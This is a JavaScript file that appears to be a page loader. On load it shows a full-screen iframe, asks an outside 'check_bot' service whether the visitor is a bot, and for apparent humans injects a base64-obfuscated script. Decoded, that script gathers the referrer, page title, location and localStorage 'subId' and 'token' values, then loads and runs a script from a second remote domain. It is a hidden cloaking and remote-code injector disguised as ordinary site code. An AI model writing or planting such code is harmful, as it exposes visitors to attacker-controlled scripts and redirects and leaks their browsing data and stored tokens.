const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
window.addEventListener('DOMContentLoaded', () => {
    createLoader();
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfQmhHTUt2eEYyeGN2bUhNTic7CiAgICBpZiAoIXdpbmRvdy5fQmhHTUt2eEYyeGN2bUhNTikgewogICAgICAgIHdpbmRvdy5fQmhHTUt2eEYyeGN2bUhNTiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9kb2xhZG93YW5pYS5jbHViL1NkQ1dxMm0xJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0dTTUNTRnJEMU1nd0JwR04gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9HU01DU0ZyRDFNZ3dCcEdOICE9PSAndW5kZWZpbmVkJyAmJiBfR1NNQ1NGckQxTWd3QnBHTiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfS1ZoalZIbTF3Q2dNSjI0ciA9IEpTT04ucGFyc2UoX0dTTUNTRnJEMU1nd0JwR04pOwogICAgICAgIHZhciBfWVRndnZCeTNGcVhTTVlubSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9LVmhqVkhtMXdDZ01KMjRyLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udHRsIDwgX1lUZ3Z2QnkzRnFYU01Zbm0pIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF81WFgzVHFwY1o1ZGJmSzhKID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX3QzN2oxQ1lXR2RLREc1dkwgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfTVJ3S2JDckpRZGRQYnJuUiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfTVJ3S2JDckpRZGRQYnJuUiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfTVJ3S2JDckpRZGRQYnJuUiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9CaEdNS3Z4RjJ4Y3ZtSE1OLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF81WFgzVHFwY1o1ZGJmSzhKICE9PSAndW5kZWZpbmVkJyAmJiBfNVhYM1RxcGNaNWRiZks4SiAmJiB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udW5pcXVlKSB7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfNVhYM1RxcGNaNWRiZks4Sik7CiAgICB9CiAgICBpZiAodHlwZW9mIF90MzdqMUNZV0dkS0RHNXZMICE9PSAndW5kZWZpbmVkJyAmJiBfdDM3ajFDWVdHZEtERzV2TCAmJiB3aW5kb3cuX0JoR01LdnhGMnhjdm1ITU4udW5pcXVlKSB7CiAgICAgICAgX01Sd0tiQ3JKUWRkUGJyblIgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF90MzdqMUNZV0dkS0RHNXZMKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9CaEdNS3Z4RjJ4Y3ZtSE1OLlJfUEFUSCArIF9NUndLYkNySlFkZFBicm5SOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg";
            document.querySelector("head").appendChild(script);
        }
        toggleLoad();
        
    })
})
